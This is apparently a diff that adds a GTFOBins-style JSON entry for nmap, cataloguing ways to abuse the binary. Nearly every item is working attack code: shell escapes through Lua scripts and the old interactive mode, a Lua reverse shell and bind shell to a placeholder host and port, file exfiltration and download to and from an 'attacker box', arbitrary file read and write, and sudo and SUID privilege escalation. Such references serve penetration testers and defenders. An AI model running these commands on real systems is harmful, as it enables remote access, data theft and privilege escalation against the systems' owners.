@@ -1,0 +1,72 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "Input echo is disabled.",
+        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n"
+      },
+      {
+        "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
+        "code": "nmap --interactive\nnmap> !sh\n"
+      }
+    ],
+    "non-interactive-reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "TF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(\"[host]\",[port]);\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "non-interactive-bind-shell": [
+      {
+        "description": "Run 'nc [host] [port]' on the attacker box to connect to the shell.",
+        "code": "TF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",[port]));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send a local file via TCP. Run 'socat -v tcp-listen:8080,reuseaddr,fork -' on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
+        "code": "nmap -p [port] [host] --script http-put --script-args http-put.url=/,http-put.file=[file]\n"
+      },
+      {
+        "description": "Send a local file via TCP. Run 'nc -l -p [port] > [file]' on the attacker box to collect the file.",
+        "code": "TF=$(mktemp)\necho 'local f=io.open(\"[file]\", 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(\"[host]\",[port]);\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., 'php -S 0.0.0.0:8080'. Note that multiple connections are made to the server and the result is placed in '$TF/IP/PORT/PATH'. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
+        "code": "nmap -p [port] [host] --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=[file]\n"
+      },
+      {
+        "description": "Fetch a remote file via TCP. Run 'nc [host] [port] < [file]' on the attacker box to send the file.",
+        "code": "TF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",[port]));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(\"[file]\", \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"[file]\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"[file]\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Input echo is disabled.",
+        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n"
+      },
+      {
+        "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
+        "code": "sudo nmap --interactive\nnmap> !sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "Input echo is disabled.",
+        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n"
+      }
+    ]
+  }
+}
